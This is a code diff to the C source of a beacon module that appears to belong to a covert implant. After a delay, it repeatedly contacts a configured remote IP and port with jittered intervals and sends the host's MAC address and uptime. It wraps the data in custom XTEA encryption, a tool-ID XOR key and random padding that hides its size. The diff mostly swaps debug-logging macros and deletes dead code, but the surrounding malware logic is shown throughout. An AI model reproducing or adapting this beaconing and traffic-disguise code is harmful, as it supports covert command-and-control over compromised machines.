@@ -29,7 +29,6 @@
 //******************************************************************
 static int send_beacon_data(BEACONINFO* beaconinfo, unsigned long uptime, int next_beacon);
 static void encrypt_data(unsigned char* src, int src_size, unsigned char* dest, unsigned char* key);
-//static void decrypt_data(unsigned char* src, unsigned char* dest);
 static int get_printable_mac(unsigned char* dest, unsigned char* src);
 static unsigned int generate_random_bytes(unsigned char * buf, unsigned int size);
 static void extract_key(unsigned char* buf, unsigned char* key);
@@ -120,7 +119,7 @@ int beacon_start( char *beaconIP, int beaconPort, unsigned long initialDelay, in
 			numTries++;
 			if( numTries == 5)
 			{
-				D(printf("ERROR: failed to pull MAC address\n" ); )
+				DLX(1, printf("ERROR: failed to pull MAC address\n"));
 					return FAILURE;
 			}
 		}
@@ -139,7 +138,7 @@ int beacon_start( char *beaconIP, int beaconPort, unsigned long initialDelay, in
 #if defined __EFENCE__ || defined __VALGRIND__
 	if ( beacon( (void *)beaconInfo ) != SUCCESS )
 	{
-		D( printf( " ERROR: failed to create beacon thread\n" ); )
+		DLX(1, printf( " ERROR: failed to create beacon thread\n" ));
 		return FAILURE;
 	}
 	else
@@ -149,7 +148,7 @@ int beacon_start( char *beaconIP, int beaconPort, unsigned long initialDelay, in
 #endif
 	if ( make_thread( beacon, (void *)beaconInfo ) != SUCCESS )
 	{
-		D( printf( " ERROR: failed to create beacon thread\n" ); )
+		DLX(1, printf( " ERROR: failed to create beacon thread\n" ));
 		return FAILURE;
 	}
 
@@ -179,15 +178,13 @@ void *beacon(void* param)
 	int counter = 0;
 #endif
 
-	D( printf ( " DEBUG: starting beacon thread\n" ); )
-
-	D( printf ( " DEBUG: starting inital beacon delay of %d\n", beaconInfo->initDelay ); )
+	DLX(4, printf ( "Starting beacon thread with initial beacon delay of %d seconds\n", beaconInfo->initDelay/1000));
 
 	//Wait out initial delay
 	Sleep(beaconInfo->initDelay);
 
 	secondsUp = GetSystemUpTime();
-	D( printf( " DEBUG: system uptime is %ld\n", secondsUp ); )
+	DLX(1, printf("System uptime is %ld seconds\n", secondsUp));
 
 	//Send initial beacon back
 
@@ -203,7 +200,7 @@ void *beacon(void* param)
 	{
 		beaconInterval = beaconInfo->interval;
 	}
-	D( printf( " DEBUG: sending [first] beacon data\n" ); )
+	DLX(2, printf( "Sending [first] beacon data\n" ));
 	ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);
 
 #if defined __EFENCE__ || defined __VALGRIND__
@@ -214,7 +211,7 @@ void *beacon(void* param)
 	for(;;)
 	{
 		//Sleep for the length of the interval
-		D( printf ( " DEBUG: starting beacon interval of %d milliseconds.\n", beaconInfo->interval ); )
+		DLX(4, printf ("\tStarting beacon interval of %d seconds.\n", beaconInfo->interval/1000));
 		Sleep(beaconInterval);
 	
 		if (beaconInfo->percentVariance > 0)
@@ -231,11 +228,11 @@ void *beacon(void* param)
 
 		//get system uptime
 		secondsUp = GetSystemUpTime();
-		D( printf( " DEBUG: system uptime is %ld\n", secondsUp ); )
+		DLX(4, printf( "\tSystem uptime is %ld\n", secondsUp));
 
 		//Beacon back
 		// TODO: SendBeaconData does not handle errors returned
-		D( printf( " DEBUG: sending beacon data\n" ); )
+		DLX(4, printf( "\tSending beacon data\n"));
 		ret = send_beacon_data(beaconInfo,secondsUp,beaconInterval);
 		if(ret == SUCCESS)
 		{
@@ -457,7 +454,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	packet = (unsigned char*) malloc(packetSize);
 	if( packet == NULL)
 	{
-		D(printf("Not enough memory to allocate packet!"));
+		DLX(1, printf("Not enough memory to allocate packet!"));
 		goto EXIT;
 	}
 	memset(packet, 0, packetSize);
@@ -551,31 +548,29 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	encrypt_size = packetSize + (8 - (packetSize % 8));
 
 	//connect to the client
-	D( printf("%s, %4d: Connecting to client...\n", __FILE__, __LINE__); )
+	DLX(4, printf("Connecting to client...\n"));
 	retval = net_connect(&sock,beaconInfo->ip, beaconInfo->port);
 
 	if ( retval != SUCCESS )
 	{
-		D( printf(" ERROR: net_connect()\n"));
-
-#ifdef DEBUG
-		if ( retval == POLARSSL_ERR_NET_CONNECT_FAILED )
-		{
-			printf( " ERROR: NET_CONNECT_FAILED\n" );
-		}
-		else if ( retval == POLARSSL_ERR_NET_SOCKET_FAILED )
-		{
-			printf( " ERROR: NET_SOCKET_FAILED\n" );
-		}
-		else if ( retval == POLARSSL_ERR_NET_UNKNOWN_HOST )
-		{
-			printf( " ERROR: NET_UNKNOWN_HOST\n" );
-		}
-		else
-		{
-			printf( " ERROR: Unknown net_connect() error\n" );
-		}
-#endif
+		DLX(1, printf("\tERROR: net_connect(): ");
+			if ( retval == POLARSSL_ERR_NET_CONNECT_FAILED )
+			{
+				printf( "NET_CONNECT_FAILED\n");
+			}
+			else if ( retval == POLARSSL_ERR_NET_SOCKET_FAILED )
+			{
+				printf( "NET_SOCKET_FAILED\n");
+			}
+			else if ( retval == POLARSSL_ERR_NET_UNKNOWN_HOST )
+			{
+				printf( "NET_UNKNOWN_HOST\n");
+			}
+			else
+			{
+				printf( "Unknown error\n");
+			}
+		);
 
 		// we can return from here. no need to goto to bottom of function because
 		// at this stage, there is nothing to clean-up
@@ -587,10 +582,10 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	}
 
 	//setup ssl
-	D( printf("%s, %4d: Setup crypto\n", __FILE__, __LINE__); )
+	DLX(4, printf("\tSetup crypto\n"));
 	if(crypt_setup_client( &hs, &ssl, &ssn, &sock ) != SUCCESS)
 	{
-		D( printf(" ERROR: crypt_setup_client()\n") );
+		DLX(4, printf("\tERROR: crypt_setup_client()\n"));
 		retval = FAILURE;
 		goto EXIT;
 	}
@@ -601,15 +596,15 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	ssl.xor_key = TOOL_ID_XOR_KEY;
 
 	//perform an SSL handshake
-	D( printf("%s, %4d: Perform SSL handshake\n", __FILE__, __LINE__); )
+	DLX(4, printf("\tPerform SSL handshake\n"));
 	if( crypt_handshake(&ssl) != SUCCESS)
 	{
-		D( printf( " ERROR: SSL connection with SSL server failed to initialize.\n" ); )
+		DLX(2, printf( "\tERROR: SSL connection with SSL server failed to initialize.\n"));
 			retval = FAILURE;
 		goto EXIT;
 	}
 
-	D( printf(" Handshake Complete!\n") );
+	DLX(4, printf("\tHandshake Complete!\n"));
 
 	//turn off the ssl encryption since we us our own
 	ssl.do_crypt = 0;
@@ -619,9 +614,9 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 
 	//embed the data size so the server knows how much data to read
 	embedSize(encrypt_size,randData);
-	D(printf("Encrypt_size is %d \n",encrypt_size));
+	DLX(4, printf("\tEncrypt_size is %d \n", encrypt_size));
 
-	D( printf( " Sending the first 64 bytes with data size encoded in random data\n" ); )
+	DLX(4, printf( "\tSending the first 64 bytes with data size encoded in random data\n"));
 	//send the bytes 
 	if( 0 > crypt_write(&ssl, randData,64) )
 	{  //TODO: this is probably no the best check... maybe 32 > cryptwrite
@@ -647,7 +642,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	enc_buf = (unsigned char*) malloc(encrypt_size); 
 	if(enc_buf == NULL)
 	{
-		D(printf("Could not allocate space for enc_buf"));
+		DLX(1, printf("Could not allocate space for enc_buf"));
 		goto EXIT;
 	}
 	memset(enc_buf, 0 , encrypt_size);
@@ -669,7 +664,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 		{
 			sz_to_send = encrypt_size - bytes_sent;
 		}
-		D( printf( " Sending: %d \n", sz_to_send ) );
+		DLX(4, printf("\tSending: %d bytes\n", sz_to_send));
 
 		//reset the buffer
 		memset(randData, 0, 64);
@@ -691,8 +686,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	} while (bytes_sent < encrypt_size);
 
 	retval = SUCCESS;
-	D( printf("Finished sending beacon about to clean up!\n"));
-	D( printf("BEACON SENT!\n"));
+	DLX(4, printf("BEACON SENT cleaning up\n"));
 
 EXIT:
 	//cleanup
@@ -800,40 +794,6 @@ void encrypt_data(unsigned char* src, int src_size, unsigned char* dest, unsigne
 	}
 }
 
-/*void decrypt_data(unsigned char* src, unsigned char* dest)
-{
-
-	xtea_context xtea;
-	int len,i;
-	unsigned char* src_ptr;
-	unsigned char* dest_ptr;
-	unsigned char enc[8];
-
-	//initialize the xtea encryption context
-	xtea_setup(&xtea,SharedKey);
-
-	len = sizeof(BEACONFIELD);//strlen(src);
-	i = 0;
-
-	while(i != len)
-	{
-		src_ptr = src + i;
-		dest_ptr = dest +i;
-
-		xtea_crypt_ecb(&xtea,XTEA_DECRYPT,src_ptr,enc);
-
-		if(len - i >= 8)
-		{
-			memcpy(dest_ptr,enc,8);
-			i += 8;
-		}
-		else
-		{
-			memcpy(dest_ptr,enc,(len - i));
-			i = i + (len-i);
-		}
-	}
-}*/
 
 //******************************************************************
 int get_printable_mac(unsigned char* dest, unsigned char* src)
@@ -841,14 +801,6 @@ int get_printable_mac(unsigned char* dest, unsigned char* src)
 	char buffer[18];
 	memset(buffer,0,18);
 
-	//change for windows2000 from sprintf_s to sprintf
-	/*sprintf(buffer,sizeof(buffer),"%.2x-%.2x-%.2x-%.2x-%.2x-%.2x",
-                src[0],
-                src[1],
-                src[2],
-                src[3],
-                src[4],
-                src[5]);*/
 	sprintf(buffer,"%.2x-%.2x-%.2x-%.2x-%.2x-%.2x",
 		src[0],
 		src[1],
@@ -861,7 +813,6 @@ int get_printable_mac(unsigned char* dest, unsigned char* src)
 	return 0;
 }
 
-
 //******************************************************************
 void extract_key(unsigned char* buf, unsigned char* key)
 {
@@ -873,11 +824,3 @@ void extract_key(unsigned char* buf, unsigned char* key)
 	//extract the key
 	memcpy(key, buf + offset + 1, 16);
 }
-
-//******************************************************************
-//************** Platform specific functions ***********************
-//******************************************************************
-
-
-
-//******************************************************************
